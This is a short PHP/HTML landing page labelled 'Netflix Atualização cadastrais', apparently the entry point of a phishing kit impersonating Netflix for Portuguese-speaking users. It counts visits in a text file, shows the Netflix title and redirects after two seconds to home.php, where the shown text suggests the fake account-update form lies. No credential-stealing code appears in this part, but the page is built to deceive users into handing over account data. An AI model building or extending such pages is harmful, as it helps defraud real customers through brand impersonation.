<!-- 
Theme Name: Netflix Atualização cadastrais
Author: PARA (sp)
 ---
  <?php
     $arquivo = "contador.txt";
     $contador = 0;

     $fp = fopen($arquivo,"r");
     $contador = fgets($fp, 26);
     fclose($fp);

     ++$contador;

     $fp = fopen($arquivo,"w+");
     fwrite($fp, $contador, 26);
     fclose($fp);
 ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<title>Netflix</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="css/estilo.css">
	
https://github.com/https://github.com/Netflixbr/netflixbr
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/bootstrap.js"></script>
	<script src="js/script.js"></script>

</head>

<body id="tela1">
	<meta http-equiv="refresh" content="2;url=home.php">
</body>
</html>
